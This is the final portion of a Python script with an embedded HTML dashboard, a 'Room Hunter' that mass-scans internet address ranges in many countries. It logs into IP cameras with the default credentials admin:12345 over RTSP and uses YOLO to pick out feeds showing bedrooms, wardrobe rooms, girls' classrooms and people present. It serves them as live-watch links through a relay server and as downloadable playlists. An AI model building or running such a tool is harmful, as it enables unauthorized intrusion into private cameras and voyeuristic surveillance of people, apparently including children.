.objs{color:#555;font-size:0.77em;margin-top:3px;
      white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.persons{color:#ffd700;font-size:0.77em}
.stream-btns{display:flex;gap:4px;margin-top:6px;flex-wrap:wrap}
.btn-live,.btn-rtsp,.btn-copy{padding:4px 9px;border-radius:5px;font-size:0.75em;
  font-weight:700;cursor:pointer;text-decoration:none;border:none;color:#fff;display:inline-block}
.btn-live{background:#1a7a2a}.btn-live:hover{background:#22a035}
.btn-rtsp{background:#1a3a7a}.btn-rtsp:hover{background:#2a4a9a}
.btn-copy{background:#3a1a1a;color:#ffd}.btn-copy:hover{background:#5a2a1a}
</style>
</head>
<body>
<div class="hdr">
  <h1>🌍 WORLD EXTREME Room Hunter</h1>
  <p>YOLO AI · Bedrooms · Wardrobe Rooms · Classrooms · 50+ Countries</p>
</div>
<div class="stats">
  <div class="scard total"><span class="val" id="stotal">0</span><span class="lbl">Total Rooms</span></div>
  <div class="scard bed"><span class="val" id="sbeds">0</span><span class="lbl">🛏️ Bedrooms</span></div>
  <div class="scard" style="--c:#ff9f43"><span class="val" style="color:#ff9f43" id="sward">0</span><span class="lbl">🚪 Wardrobe</span></div>
  <div class="scard cls"><span class="val" id="scls">0</span><span class="lbl">🏫 Classrooms</span></div>
  <div class="scard liv"><span class="val" id="sliv">0</span><span class="lbl">🛋️ Living</span></div>
  <div class="scard" style="--c:#9b59b6"><span class="val" style="color:#9b59b6" id="soth">0</span><span class="lbl">🏠 Other</span></div>
  <div class="scard"><span class="val" id="ssel" style="color:#ff6b6b">0</span><span class="lbl">✓ Selected</span></div>
</div>
<div class="updated">⏱️ Auto-refresh 5s · Last: <span id="upd">—</span></div>
<div class="filters">
  <span class="fb on" onclick="setF('all')">All</span>
  <span class="fb" onclick="setF('bedroom')">🛏️ Bedroom</span>
  <span class="fb" onclick="setF('wardrobe_room')">🚪 Wardrobe</span>
  <span class="fb" onclick="setF('girls_classroom')">🏫 Classroom</span>
  <span class="fb" onclick="setF('living_room')">🛋️ Living</span>
  <span class="fb" onclick="setF('any_indoor')">🏠 Other</span>
</div>
<div class="ctrls">
  <button class="btn btn-teal" onclick="selAll()">✓ All</button>
  <button class="btn btn-gray" onclick="desel()">✗ None</button>
  <button class="btn btn-red" onclick="dlm3u()">⬇️ .m3u</button>
  <button class="btn btn-gray" onclick="location.reload()">🔄 Refresh</button>
</div>
<div class="grid" id="grid"></div>
<script>
const BADGE_COLORS={bedroom:'#ff6b6b',wardrobe_room:'#ff9f43',girls_classroom:'#45b7d1',living_room:'#ffd700',any_indoor:'#9b59b6'};
let cams=[],sel=new Set(),filt='all';
function load(){
  fetch('manifest.json?t='+Date.now()).then(r=>r.json()).then(d=>{
    cams=d.cameras||[];
    const tc=d.type_counts||{};
    document.getElementById('stotal').textContent=cams.length;
    document.getElementById('sbeds').textContent=tc.bedroom||0;
    document.getElementById('sward').textContent=tc.wardrobe_room||0;
    document.getElementById('scls').textContent=tc.girls_classroom||0;
    document.getElementById('sliv').textContent=tc.living_room||0;
    document.getElementById('soth').textContent=tc.any_indoor||0;
    document.getElementById('upd').textContent=new Date(parseInt(d.timestamp)*1000).toLocaleTimeString();
    render();
  }).catch(()=>{});
}
function render(){
  const g=document.getElementById('grid'); g.innerHTML='';
  cams.filter(c=>filt==='all'||c.room_type===filt).forEach((c,i)=>{
    const idx=cams.indexOf(c);
    const d=document.createElement('div');
    d.className='card'+(sel.has(idx)?' sel':'');
    const rtsp=c.rtsp_urls&&c.rtsp_urls[0]?c.rtsp_urls[0]:'';
    const relayUrl=`http://51.68.33.34:9094/watch/${c.ip}`;
    const bc=BADGE_COLORS[c.room_type]||'#666';
    const pcnt=c.person_count>0?`<span class="persons">👤×${c.person_count}</span> `:'';
    d.innerHTML=`
      <span class="badge" style="background:${bc}88;color:#fff">${c.room_label||'Room'}</span>
      <input class="ckb" type="checkbox" ${sel.has(idx)?'checked':''} onchange="tog(${idx})" onclick="event.stopPropagation()">
      <img src="${c.screenshot_url||''}" alt="${c.ip}" loading="lazy" title="Click to watch live">
      <div class="info">
        <div class="ip">${c.ip}</div>
        <div class="objs">${pcnt}${c.objects||''}</div>
        <div class="stream-btns">
          <a class="btn-live" href="${relayUrl}" target="_blank" onclick="event.stopPropagation()">📺 Watch Live</a>
          <a class="btn-rtsp" href="${rtsp}" onclick="event.stopPropagation()" title="${rtsp}">▶ RTSP</a>
          <button class="btn-copy" onclick="event.stopPropagation();copyRtsp('${rtsp.replace(/'/g,'\\\'')}')" title="Copy RTSP URL">📋</button>
        </div>
      </div>`;
    d.querySelector('img').onclick=()=>window.open(relayUrl,'_blank');
    g.appendChild(d);
  });
}
function setF(f){filt=f;document.querySelectorAll('.fb').forEach(b=>b.classList.toggle('on',b.onclick.toString().includes(`'${f}'`)));render();}
function tog(i){sel.has(i)?sel.delete(i):sel.add(i);document.getElementById('ssel').textContent=sel.size;render();}
function selAll(){cams.forEach((_,i)=>{if(filt==='all'||cams[i].room_type===filt)sel.add(i)});document.getElementById('ssel').textContent=sel.size;render();}
function desel(){sel.clear();document.getElementById('ssel').textContent=0;render();}
function dlm3u(){
  if(!sel.size)return alert('Select cameras first');
  let m='#EXTM3U\\n';
  sel.forEach(i=>{const c=cams[i];if(c.rtsp_urls&&c.rtsp_urls[0])m+=`#EXTINF:-1,[${c.room_label}] ${c.ip}\\n${c.rtsp_urls[0]}\\n`;});
  const a=document.createElement('a');
  a.href=URL.createObjectURL(new Blob([m],{type:'audio/x-mpegurl'}));
  a.download=`world_rooms_${sel.size}.m3u`; a.click();
}
function copyRtsp(u){
  navigator.clipboard.writeText(u).then(()=>alert('Copied: '+u)).catch(()=>{
    var t=document.createElement('textarea');t.value=u;document.body.appendChild(t);
    t.select();document.execCommand('copy');document.body.removeChild(t);alert('Copied!');
  });
}
load(); setInterval(load, 5000);
</script>
</body>
</html>"""

    with open(os.path.join(OUT_DIR, "screenshot_selector.html"), 'w') as f:
        f.write(html)


# ═══════════════════════════════════════════════════════════════════
# STATE PERSISTENCE
# ═══════════════════════════════════════════════════════════════════

def save_state(rooms):
    with open(STATE_FILE, 'w') as f:
        json.dump({"rooms": rooms, "ts": int(time.time())}, f)
    with open(PROBED_FILE, 'a') as f:
        pass  # We append to probed_file inline


def load_state():
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE) as f:
                d = json.load(f)
            rooms = d.get("rooms", [])
            log(f"  Resumed: {len(rooms)} rooms from previous run")
            return rooms
        except Exception:
            pass
    return []


# ═══════════════════════════════════════════════════════════════════
# MAIN PIPELINE
# ═══════════════════════════════════════════════════════════════════

def main():
    global stop_flag

    def sig_handler(sig, frame):
        global stop_flag
        stop_flag = True
        log("[!] Stopping — saving state...")
    signal.signal(signal.SIGINT, sig_handler)
    signal.signal(signal.SIGTERM, sig_handler)

    t0 = time.time()
    log("=" * 65)
    log("🌍 WORLD EXTREME YOLO ROOM HUNTER v2")
    log(f"  Countries: {len(COUNTRIES)} | Target: {TARGET_ROOMS} rooms")
    log(f"  Grab workers: {MAX_GRAB_WORKERS} | YOLO workers: {MAX_PARALLEL_YOLO}")
    log(f"  TCP pre-scan workers: {MAX_TCP_WORKERS}")
    log(f"  Ports: {CAM_PORTS[:8]}...")
    log(f"  Filters: bedroom, wardrobe_room, girls_classroom, living_room")
    log("=" * 65)

    rooms = load_state()

    # ── Discovery Phase (NON-BLOCKING) ──

    # Step 1: Download CIDRs
    cidr_file = download_cidrs()

    # Step 2: Launch masscans in BACKGROUND — do not wait
    if not stop_flag:
        launch_background_masscans(cidr_file)

    # Step 3: Parse ALL existing scan files RIGHT NOW (masscan results so far)
    all_ips = parse_all_existing_ips()

    # Method 2: ONVIF local discovery
    onvif_ips = onvif_discover_local()
    all_ips.extend(onvif_ips)

    # Method 3: Shodan (if key set)
    if SHODAN_API_KEY and not stop_flag:
        shodan_ips = shodan_search_cameras()
        all_ips.extend(shodan_ips)

    # Remove dupes and already-probed
    seen = set()
    unique_ips = []
    for ip in all_ips:
        if ip not in seen and ip not in probed_set:
            seen.add(ip)
            unique_ips.append(ip)

    log(f"[*] Unique IPs to probe RIGHT NOW: {len(unique_ips)}")

    # Step 4: Start streaming NEW IPs from ongoing masscans into a queue
    new_ip_queue = stream_new_ips(set(unique_ips) | probed_set)

    # ── Also classify already-existing frames first ──
    log("[PHASE 1] Classifying existing frames with YOLO...")
    existing_ips = {r["ip"] for r in rooms}
    existing_frames = []
    for fdir in [
        os.path.join(SCRIPT_DIR, "spain_frames"),
        os.path.join(SCRIPT_DIR, "spain_indoor_frames"),
        FRAMES_DIR,
    ]:
        if not os.path.isdir(fdir):
            continue
        for fn in os.listdir(fdir):
            if fn.endswith('.jpg'):
                ip = fn.replace('.jpg', '').replace('_', '.')
                if ip not in existing_ips:
                    fp = os.path.join(fdir, fn)
                    if os.path.getsize(fp) > 5000:
                        existing_frames.append((ip, fp))

    log(f"  {len(existing_frames)} existing frames to classify")

    if existing_frames:
        with ProcessPoolExecutor(
            max_workers=MAX_PARALLEL_YOLO,
            initializer=_yolo_worker_init
        ) as yolo_pool:
            futures = {
                yolo_pool.submit(_yolo_classify, (fp,)): (ip, fp)
                for ip, fp in existing_frames
            }
            for i, future in enumerate(as_completed(futures)):
                if stop_flag:
                    break
                ip, fp = futures[future]
                result = future.result()
                if result:
                    rooms.append({
                        "ip": ip,
                        "frame_path": fp,
                        **result,
                        "size_bytes": os.path.getsize(fp),
                        "rtsp_urls": [f"rtsp://admin:12345@{ip}:554/Streaming/Channels/101"],
                        "screenshot_url": "",
                    })
                    build_selector(rooms)
                    log(f"  🎯 #{len(rooms)} {result['room_label']} @ {ip} | {result['objects']}")

                if (i + 1) % 50 == 0:
                    log(f"  [{i+1}/{len(existing_frames)}] frames scanned, {len(rooms)} rooms")

    save_state(rooms)
    build_selector(rooms, {"phase": "1_existing_done", "frames_scanned": len(existing_frames)})
    log(f"[✓] Phase 1: {len(rooms)} rooms from {len(existing_frames)} existing frames")

    if stop_flag or len(rooms) >= TARGET_ROOMS:
        build_selector(rooms)
        save_state(rooms)
        return

    # ── Phase 2: Probe new IPs ──
    log(f"\n[PHASE 2] Probing {len(unique_ips)} IPs with {MAX_GRAB_WORKERS} grab workers...")
    log(f"  (New IPs from ongoing masscans will auto-feed every 30s)")

    probed = 0
    grabbed = 0
    probed_file_handle = open(PROBED_FILE, 'a')

    # Process in chunks of 2000; between chunks drain the new_ip_queue
    CHUNK = 2000

    def get_next_chunk(source_list, used_offset, queue):
        """Get next chunk from source list + any newly streamed IPs."""
        chunk = source_list[used_offset:used_offset + CHUNK]
        offset_next = used_offset + len(chunk)
        # Also drain streamed queue
        streamed = []
        while not queue.empty():
            try:
                ip = queue.get_nowait()
                if ip not in probed_set:
                    streamed.append(ip)
            except Exception:
                break
        return chunk + streamed, offset_next

    offset = 0
    while not stop_flag and len(rooms) < TARGET_ROOMS:
        chunk, offset = get_next_chunk(unique_ips, offset, new_ip_queue)
        if not chunk:
            # No IPs right now — wait for new ones from masscan
            log("  [*] Waiting for masscan to surface new IPs (30s)...")
            time.sleep(30)
            chunk, offset = get_next_chunk(unique_ips, offset, new_ip_queue)
            if not chunk:
                log("  [*] No more IPs. Masscans still running in background.")
                time.sleep(60)
                chunk, offset = get_next_chunk(unique_ips, offset, new_ip_queue)
                if not chunk:
                    break

        log(f"  Chunk: probing {len(chunk)} IPs | total rooms so far: {len(rooms)}")

        grab_futures = {}
        with ThreadPoolExecutor(max_workers=MAX_GRAB_WORKERS) as grab_pool:
            grab_futures = {grab_pool.submit(grab_frame_optimized, ip): ip for ip in chunk}

            with ProcessPoolExecutor(
                max_workers=MAX_PARALLEL_YOLO,
                initializer=_yolo_worker_init
            ) as yolo_pool:
                yolo_futures = {}

                for future in as_completed(grab_futures):
                    if stop_flag or len(rooms) >= TARGET_ROOMS:
                        break

                    probed += 1
                    ip = grab_futures[future]
                    probed_file_handle.write(ip + "\n")

                    result = future.result()
                    if result:
                        _, fpath = result
                        grabbed += 1
                        yf = yolo_pool.submit(_yolo_classify, (fpath,))
                        yolo_futures[yf] = (ip, fpath)

                # Harvest YOLO results
                for yf in as_completed(yolo_futures):
                    if stop_flag:
                        break
                    ip, fp = yolo_futures[yf]
                    yolo_result = yf.result()
                    if yolo_result:
                        with found_lock:
                            rooms.append({
                                "ip": ip,
                                "frame_path": fp,
                                **yolo_result,
                                "size_bytes": os.path.getsize(fp),
                                "rtsp_urls": [f"rtsp://admin:12345@{ip}:554/Streaming/Channels/101"],
                                "screenshot_url": "",
                            })
                        build_selector(rooms)
                        save_state(rooms)
                        label = yolo_result['room_label']
                        score = yolo_result['yolo_score']
                        log(f"  🎯 ROOM #{len(rooms)}: {label} @ {ip} score={score:.1f} | {yolo_result['objects']}")

        elapsed = time.time() - t0
        rate = probed / max(elapsed, 1)
        type_counts = {}
        for r in rooms:
            rt = r.get("room_type", "?")
            type_counts[rt] = type_counts.get(rt, 0) + 1
        log(f"\n  📊 Probed:{probed} Grabbed:{grabbed} Rooms:{len(rooms)} | {rate:.1f} ip/s")
        log(f"     {type_counts}")
        probed_file_handle.flush()

    probed_file_handle.close()

    # Final
    rooms.sort(key=lambda x: (x.get("priority", 99), -x.get("yolo_score", 0)))
    build_selector(rooms)
    save_state(rooms)

    elapsed = time.time() - t0
    type_counts = {}
    for r in rooms:
        type_counts[r.get("room_type","?")] = type_counts.get(r.get("room_type","?"),0)+1

    log("")
    log("=" * 65)
    log(f"🏁 COMPLETE in {elapsed/3600:.1f}h")
    log(f"   Probed:{probed} Grabbed:{grabbed} Rooms:{len(rooms)}")
    for rt, cnt in sorted(type_counts.items()):
        lbl = ROOM_RULES.get(rt, {}).get("label", rt)
        log(f"     {lbl}: {cnt}")
    log(f"   Selector → {OUT_DIR}/screenshot_selector.html")
    log("=" * 65)


if __name__ == "__main__":
    main()
